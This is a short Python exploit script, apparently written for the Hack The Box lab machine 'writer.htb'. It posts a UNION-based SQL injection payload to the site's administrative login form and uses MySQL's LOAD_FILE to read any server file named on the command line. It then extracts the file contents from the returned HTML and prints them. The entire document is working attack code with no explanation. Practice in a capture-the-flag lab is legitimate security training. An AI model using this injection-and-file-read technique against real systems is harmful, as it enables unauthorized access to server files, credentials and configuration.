import requests
import re
import sys

url="http://writer.htb/administrative"
payload=f"admin'union select 1,(LOAD_FILE(\"{sys.argv[1]}\")),3,4,5,6 -- -"
data={"uname":payload,"password":""}

r=requests.post(url,data=data)

final=r.text.replace('\n','\t')
file=re.search("<h3.*</h3>",final)

file_content=file[0]
file_content=file_content.replace('<h3 class="animation-slide-top">','')
file_content=file_content.replace('</h3>','')
file_content=file_content.replace('\t','\n')

print(file_content)